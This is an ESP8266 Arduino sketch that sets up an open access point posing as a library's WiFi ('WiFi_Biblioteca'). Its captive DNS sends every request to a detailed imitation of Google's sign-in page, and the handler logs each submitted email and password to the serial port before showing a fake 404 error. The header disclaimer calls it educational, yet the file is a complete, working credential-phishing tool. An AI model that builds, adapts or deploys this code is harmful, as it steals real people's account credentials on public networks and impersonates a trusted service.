/*
  Author: Gabriele Parietti

------------------------------------------------------------------------------
MIT License

Copyright (c) [2025] [Gabriele Parietti]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

------------------------------------------------------------------------------

  === IMPORTANT DISCLAIMER ===
The author is not responsible for any misuse of this project, including but not limited to phishing or any other malicious activities.
This project is intended solely for educational and ethical purposes to raise awareness about Wi-Fi security risks. 
It shows how to create a realistic login portal to highlight cybersecurity risks in public WiFi networks.

  WARNINGS:
  1. Do NOT use this code for illegal activities or phishing
  2. Use ONLY in controlled environments with explicit authorization
  3. The author assumes no responsibility for misuse of this code
  4. This project demonstrates how credentials can be easily compromised
     on insecure networks, emphasizing the importance of:
     - Always verifying WiFi network legitimacy
     - Using HTTPS connections
     - Avoiding public WiFi for sensitive operations
*/

// HTML page supports language switching between Italian and English!

#include <DNSServer.h>         // DNS captive portal library
#include <ESP8266WebServer.h>  // Web server library
#include <ESP8266WiFi.h>       // WiFi functionality library

// ===== CONFIGURATION =====
const char* ssid = "WiFi_Biblioteca";  // WiFi network name (modify here)
const byte DNS_PORT = 53;              // Standard DNS port (do not modify)
IPAddress apIP(192, 168, 4, 1);        // Access point IP (modify if needed)

DNSServer dnsServer;          // DNS server for captive portal
ESP8266WebServer server(80);  // Web server on port 80

// ===== LANGUAGE SELECTION =====
String currentLanguage = "it";  // Default language: it=Italian, en=English

// ===== LOGIN PAGE =====
String getLoginPage() {
  String page = R"rawliteral(
<!DOCTYPE html>
<html lang=")rawliteral";
  page += currentLanguage;
  page += R"rawliteral(">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>)rawliteral";
  page += (currentLanguage == "it" ? "Accedi - Google" : "Sign in - Google");
  page += R"rawliteral(</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
        }

        body {
            background-color: #f8f9fa;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            color: #202124;
        }

        .google-header {
            padding: 20px;
            text-align: right;
        }

        .header-links {
            display: flex;
            justify-content: flex-end;
            gap: 15px;
            align-items: center;
        }

        .header-link {
            color: rgba(0, 0, 0, 0.87);
            text-decoration: none;
            font-size: 13px;
        }

        .header-link:hover {
            text-decoration: underline;
        }

        .app-icon {
            width: 24px;
            height: 24px;
            padding: 8px;
            color: #5f6368;
            cursor: pointer;
        }

        .profile-icon {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background-color: #1a73e8;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 500;
            cursor: pointer;
            margin-left: 10px;
        }

        .main-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .google-logo {
            margin-bottom: 30px;
            text-align: center;
        }

        .google-logo span {
            font-size: 70px;
            font-weight: 400;
            letter-spacing: -3px;
        }

        .blue { color: #4285f4; }
        .red { color: #ea4335; }
        .yellow { color: #fbbc05; }
        .green { color: #34a853; }

        .login-container {
            width: 100%;
            max-width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            background-color: #fff;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
            text-align: center;
        }

        .login-title {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 10px;
        }

        .login-subtitle {
            color: #5f6368;
            font-size: 16px;
            margin-bottom: 40px;
        }

        .input-container {
            position: relative;
            margin-bottom: 15px;
        }

        .input-box {
            border: 1px solid #dadce0;
            border-radius: 4px;
            height: 55px;
            padding: 13px 15px;
            font-size: 16px;
            width: 100%;
            outline: none;
            transition: border-color 0.2s;
        }

        .input-box:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
        }

        .forgot-email {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
            margin-bottom: 40px;
            display: inline-block;
            text-align: left;
            width: 100%;
        }

        .forgot-email:hover {
            text-decoration: underline;
        }

        .button-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 30px;
        }

        .create-account {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
            padding: 8px 0;
        }

        .create-account:hover {
            text-decoration: underline;
        }

        .next-btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .next-btn:hover {
            background-color: #1b66c9;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
        }

        .error-message {
            background-color: #fce8e6;
            border: 1px solid #f28b82;
            border-radius: 4px;
            padding: 15px;
            margin: 20px 0;
            text-align: left;
            font-size: 14px;
        }

        .error-icon {
            color: #ea4335;
            font-size: 20px;
            vertical-align: middle;
            margin-right: 10px;
        }

        .google-footer {
            background-color: #f2f2f2;
            padding: 20px;
            color: #70757a;
            font-size: 14px;
        }

        .footer-top {
            padding: 15px 30px;
            border-bottom: 1px solid #dadce0;
        }

        .footer-bottom {
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            padding: 15px 30px;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            gap: 25px;
        }

        .footer-link {
            color: #70757a;
            text-decoration: none;
        }

        .footer-link:hover {
            text-decoration: underline;
        }

        @media (max-width: 600px) {
            .google-logo span {
                font-size: 60px;
            }
            
            .login-container {
                padding: 30px 24px;
            }
            
            .footer-bottom {
                flex-direction: column;
                align-items: center;
                gap: 15px;
            }
            
            .footer-links {
                justify-content: center;
            }
        }
    </style>
</head>
<body>
    <header class="google-header">
        <div class="header-links">
            <a href="#" class="header-link">)rawliteral";
  page += (currentLanguage == "it" ? "Gmail" : "Gmail");
  page += R"rawliteral(</a>
            <a href="#" class="header-link">)rawliteral";
  page += (currentLanguage == "it" ? "Immagini" : "Images");
  page += R"rawliteral(</a>
            <div class="app-icon">
                <svg focusable="false" viewBox="0 0 24 24" width="24" height="24">
                    <path d="M6,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM16,6c0,1.1 0.9,2 2,2s2,-0.9 2,-2 -0.9,-2 -2,-2 -2,0.9 -2,2zM12,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2z"></path>
                </svg>
            </div>
            <div class="profile-icon">M</div>
        </div>
    </header>

    <main class="main-container">
        <div class="google-logo">
            <span class="blue">G</span>
            <span class="red">o</span>
            <span class="yellow">o</span>
            <span class="blue">g</span>
            <span class="green">l</span>
            <span class="red">e</span>
        </div>
        
        <div class="login-container">
            <h1 class="login-title">)rawliteral";
  page += (currentLanguage == "it" ? "Accedi" : "Sign in");
  page += R"rawliteral(</h1>
            <p class="login-subtitle">)rawliteral";
  page +=
      (currentLanguage == "it" ? "Continua con Google" : "Continue to Google");
  page += R"rawliteral(</p>
            <form action="/login" method="POST">
                <div class="input-container">
                    <input name="email" type="email" class="input-box" placeholder=")rawliteral";
  page += (currentLanguage == "it" ? "Email o telefono" : "Email or phone");
  page += R"rawliteral(" required>
                </div>
                <div class="input-container">
                    <input name="password" type="password" class="input-box" placeholder=")rawliteral";
  page += (currentLanguage == "it" ? "Password" : "Password");
  page += R"rawliteral(" required>
                </div>
                
                <a href="#" class="forgot-email">)rawliteral";
  page +=
      (currentLanguage == "it" ? "Hai dimenticato l'email?" : "Forgot email?");
  page += R"rawliteral(</a>
                
                <div class="button-container">
                    <a href="#" class="create-account">)rawliteral";
  page += (currentLanguage == "it" ? "Crea un account" : "Create account");
  page += R"rawliteral(</a>
                    <button type="submit" class="next-btn">)rawliteral";
  page += (currentLanguage == "it" ? "Avanti" : "Next");
  page += R"rawliteral(</button>
                </div>
            </form>
        </div>
    </main>

    <footer class="google-footer">
        <div class="footer-top">
            )rawliteral";
  page += (currentLanguage == "it" ? "Italia" : "Italy");
  page += R"rawliteral(
        </div>
        <div class="footer-bottom">
            <div class="footer-links">
                <a href="#" class="footer-link">)rawliteral";
  page += (currentLanguage == "it" ? "Informazioni" : "About");
  page += R"rawliteral(</a>
                <a href="#" class="footer-link">)rawliteral";
  page += (currentLanguage == "it" ? "Privacy" : "Privacy");
  page += R"rawliteral(</a>
                <a href="#" class="footer-link">)rawliteral";
  page += (currentLanguage == "it" ? "Termini" : "Terms");
  page += R"rawliteral(</a>
                <a href="#" class="footer-link">)rawliteral";
  page += (currentLanguage == "it" ? "Impostazioni" : "Settings");
  page += R"rawliteral(</a>
            </div>
            <div class="footer-links">
                <a href="#" class="footer-link">)rawliteral";
  page += (currentLanguage == "it" ? "Guida" : "Help");
  page += R"rawliteral(</a>
                <a href="#" class="footer-link">)rawliteral";
  page += (currentLanguage == "it" ? "Account" : "Account");
  page += R"rawliteral(</a>
                <a href="/lang?l=)rawliteral";
  page += (currentLanguage == "it" ? "en" : "it");
  page += R"rawliteral(" class="footer-link">)rawliteral";
  page += (currentLanguage == "it" ? "English" : "Italiano");
  page += R"rawliteral(</a>
            </div>
        </div>
    </footer>
</body>
</html>
)rawliteral";
  return page;
}

// ===== ERROR PAGE =====
String getErrorPage() {
  String page = R"rawliteral(
<!DOCTYPE html>
<html lang=")rawliteral";
  page += currentLanguage;
  page += R"rawliteral(">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>)rawliteral";
  page += (currentLanguage == "it" ? "Errore - Google" : "Error - Google");
  page += R"rawliteral(</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
        }

        body {
            background-color: #f8f9fa;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            color: #202124;
        }

        .google-header {
            padding: 20px;
            text-align: right;
        }

        .header-links {
            display: flex;
            justify-content: flex-end;
            gap: 15px;
            align-items: center;
        }

        .header-link {
            color: rgba(0, 0, 0, 0.87);
            text-decoration: none;
            font-size: 13px;
        }

        .header-link:hover {
            text-decoration: underline;
        }

        .app-icon {
            width: 24px;
            height: 24px;
            padding: 8px;
            color: #5f6368;
            cursor: pointer;
        }

        .profile-icon {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background-color: #1a73e8;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 500;
            cursor: pointer;
            margin-left: 10px;
        }

        .main-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .google-logo {
            margin-bottom: 30px;
            text-align: center;
        }

        .google-logo span {
            font-size: 70px;
            font-weight: 400;
            letter-spacing: -3px;
        }

        .blue { color: #4285f4; }
        .red { color: #ea4335; }
        .yellow { color: #fbbc05; }
        .green { color: #34a853; }

        .login-container {
            width: 100%;
            max-width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            background-color: #fff;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
            text-align: center;
        }

        .login-title {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 10px;
        }

        .login-subtitle {
            color: #5f6368;
            font-size: 16px;
            margin-bottom: 40px;
        }

        .error-message {
            background-color: #fce8e6;
            border: 1px solid #f28b82;
            border-radius: 4px;
            padding: 15px;
            margin: 20px 0;
            text-align: left;
            font-size: 14px;
        }

        .error-icon {
            color: #ea4335;
            font-size: 20px;
            vertical-align: middle;
            margin-right: 10px;
        }

        .next-btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 20px;
            display: inline-block;
            text-decoration: none;
        }

        .next-btn:hover {
            background-color: #1b66c9;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
        }

        .google-footer {
            background-color: #f2f2f2;
            padding: 20px;
            color: #70757a;
            font-size: 14px;
        }

        .footer-top {
            padding: 15px 30px;
            border-bottom: 1px solid #dadce0;
        }

        .footer-bottom {
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            padding: 15px 30px;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            gap: 25px;
        }

        .footer-link {
            color: #70757a;
            text-decoration: none;
        }

        .footer-link:hover {
            text-decoration: underline;
        }

        @media (max-width: 600px) {
            .google-logo span {
                font-size: 60px;
            }
            
            .login-container {
                padding: 30px 24px;
            }
            
            .footer-bottom {
                flex-direction: column;
                align-items: center;
                gap: 15px;
            }
            
            .footer-links {
                justify-content: center;
            }
        }
    </style>
</head>
<body>
    <header class="google-header">
        <div class="header-links">
            <a href="#" class="header-link">)rawliteral";
  page += (currentLanguage == "it" ? "Gmail" : "Gmail");
  page += R"rawliteral(</a>
            <a href="#" class="header-link">)rawliteral";
  page += (currentLanguage == "it" ? "Immagini" : "Images");
  page += R"rawliteral(</a>
            <div class="app-icon">
                <svg focusable="false" viewBox="0 0 24 24" width="24" height="24">
                    <path d="M6,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM16,6c0,1.1 0.9,2 2,2s2,-0.9 2,-2 -0.9,-2 -2,-2 -2,0.9 -2,2zM12,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2z"></path>
                </svg>
            </div>
            <div class="profile-icon">M</div>
        </div>
    </header>

    <main class="main-container">
        <div class="google-logo">
            <span class="blue">G</span>
            <span class="red">o</span>
            <span class="yellow">o</span>
            <span class="blue">g</span>
            <span class="green">l</span>
            <span class="red">e</span>
        </div>
        
        <div class="login-container">
            <h1 class="login-title">)rawliteral";
  page += (currentLanguage == "it" ? "Errore 404" : "404 Error");
  page += R"rawliteral(</h1>
            <p class="login-subtitle">)rawliteral";
  page += (currentLanguage == "it" ? "Richiesta non valida" : "Bad Request");
  page += R"rawliteral(</p>
            
            <div class="error-message">
                <span class="error-icon">!</span>
                )rawliteral";
  page += (currentLanguage == "it"
               ? "Errore 404: Richiesta non valida. Riprova più tardi."
               : "404 Error: Bad Request. Please try again later.");
  page += R"rawliteral(
            </div>
            
            <a href="/" class="next-btn">)rawliteral";
  page += (currentLanguage == "it" ? "Riprova" : "Try again");
  page += R"rawliteral(</a>
        </div>
    </main>

    <footer class="google-footer">
        <div class="footer-top">
            )rawliteral";
  page += (currentLanguage == "it" ? "Italia" : "Italy");
  page += R"rawliteral(
        </div>
        <div class="footer-bottom">
            <div class="footer-links">
                <a href="#" class="footer-link">)rawliteral";
  page += (currentLanguage == "it" ? "Informazioni" : "About");
  page += R"rawliteral(</a>
                <a href="#" class="footer-link">)rawliteral";
  page += (currentLanguage == "it" ? "Privacy" : "Privacy");
  page += R"rawliteral(</a>
                <a href="#" class="footer-link">)rawliteral";
  page += (currentLanguage == "it" ? "Termini" : "Terms");
  page += R"rawliteral(</a>
                <a href="#" class="footer-link">)rawliteral";
  page += (currentLanguage == "it" ? "Impostazioni" : "Settings");
  page += R"rawliteral(</a>
            </div>
            <div class="footer-links">
                <a href="#" class="footer-link">)rawliteral";
  page += (currentLanguage == "it" ? "Guida" : "Help");
  page += R"rawliteral(</a>
                <a href="#" class="footer-link">)rawliteral";
  page += (currentLanguage == "it" ? "Account" : "Account");
  page += R"rawliteral(</a>
                <a href="/lang?l=)rawliteral";
  page += (currentLanguage == "it" ? "en" : "it");
  page += R"rawliteral(" class="footer-link">)rawliteral";
  page += (currentLanguage == "it" ? "English" : "Italiano");
  page += R"rawliteral(</a>
            </div>
        </div>
    </footer>
</body>
</html>
)rawliteral";
  return page;
}

// ===== LANGUAGE HANDLER =====
void handleLanguage() {
  if (server.hasArg("l")) {
    String lang = server.arg("l");
    if (lang == "en" || lang == "it") {
      currentLanguage = lang;
    }
  }
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

// ===== ROOT PAGE HANDLER =====
void handleRoot() { server.send(200, "text/html", getLoginPage()); }

// ===== LOGIN HANDLER =====
void handleLogin() {
  // Get user credentials
  String email = server.arg("email");
  String password = server.arg("password");

  // Log credentials to serial (FOR DEMONSTRATION ONLY)
  Serial.println("========== NEW LOGIN ==========");
  Serial.println("Email: " + email);
  Serial.println("Password: " + password);
  Serial.println("===============================");

  // Show error page with 404 Bad Request
  server.send(404, "text/html", getErrorPage());
}

// ===== INITIAL SETUP =====
void setup() {
  Serial.begin(115200);  // Start serial communication

  // Access Point configuration
  WiFi.mode(WIFI_AP);  // Set Access Point mode
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));  // Configure IP
  WiFi.softAP(ssid);  // Start AP with configured name

  // Start DNS server (captive portal)
  // IMPORTANT: enables automatic redirect when user tries to open any website after connecting.
  dnsServer.start(DNS_PORT, "*", apIP);

  // Web server configuration
  server.on("/", handleRoot);                   // Main page
  server.on("/login", HTTP_POST, handleLogin);  // Login handling
  server.on("/lang", handleLanguage);           // Language change
  server.onNotFound(handleRoot);                // Redirect all pages to login

  server.begin();  // Start web server
  Serial.println("Active Access Point. Connect to " + String(ssid));
  Serial.println("Web server started at http://192.168.4.1");
}

// ===== MAIN LOOP =====
void loop() {
  dnsServer.processNextRequest();  // Handle DNS requests
  server.handleClient();           // Handle web clients
}
